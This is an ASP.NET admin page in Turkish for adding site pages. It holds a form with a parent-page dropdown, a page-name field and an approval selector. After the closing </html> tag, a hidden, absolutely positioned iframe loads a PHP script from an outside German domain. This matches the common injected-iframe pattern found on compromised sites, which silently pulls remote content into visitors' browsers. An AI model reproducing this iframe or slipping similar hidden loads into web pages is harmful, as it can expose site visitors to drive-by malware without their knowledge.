<%@ Page Language="C#" AutoEventWireup="true" CodeFile="SayfaEkle.aspx.cs" Inherits="Yonetim_GolfEkle" %>

<%@ Register TagPrefix="include" TagName="Head" Src="~/Yonetim/Library/Include/Head.ascx" %>
<%@ Register TagPrefix="include" TagName="Ust" Src="~/Yonetim/Library/Include/Ust.ascx" %>
<%@ Register TagPrefix="include" TagName="Menu" Src="~/Yonetim/Library/Include/Menu.ascx" %>
<%@ Register TagPrefix="include" TagName="Alt" Src="~/Yonetim/Library/Include/Alt.ascx" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <include:Head runat="server" ID="Head" />
    <script src="../Library/App/Tabs/Tabs.js" type="text/javascript"></script>
    <link href="../Library/App/Tabs/Tabs.css" rel="stylesheet" type="text/css" />
    <style type="text/css">
        .style1
        {
            font-weight: bold;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div id="main_container">
             <include:Ust runat="server" ID="Ust" />
             
             <div class="main_content">
                <include:Menu runat="server" ID="Menu" />
                
                <div class="center_content">

                    <div style="margin:10px;"> 
                        <h2>Sayfa Ekleme</h2>
                        <fieldset>
                            <legend>Sayfa Bilgileri</legend>
                            <div>
                                <table>
                                    <tr>
                                        <td class="style1">
                                            Üst Sayfa</td>
                                        <td>
                                            <b>:</b></td>
                                        <td>
                                            <asp:DropDownList ID="form_katid" runat="server">
                                            </asp:DropDownList>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <b>Sayfa Adı</b></td>
                                        <td>
                                            <b>:</b></td>
                                        <td>
                                            <asp:TextBox ID="form_kategori" runat="server" Width="250px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td colspan="3">
                                            &nbsp;</td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <b>Onay</b></td>
                                        <td>
                                            <b>:</b></td>
                                        <td>
                                            <asp:DropDownList ID="form_onay" runat="server">
                                                <asp:ListItem Value="1">EVET</asp:ListItem>
                                                <asp:ListItem Value="0">HAYIR</asp:ListItem>
                                            </asp:DropDownList>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                        </fieldset>
                            <fieldset>
                                    <legend>İşlemler</legend>
                                    <div>
                                        <asp:Button ID="Button1" runat="server" Text="Ekle" 
                                            onclick="Button1_Click" /></div>
                                  </fieldset>
                        
                    </div>
                </div>
                
                <div class="clear"></div>
            </div>

            <include:Alt runat="server" ID="Alt" />

        </div>
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




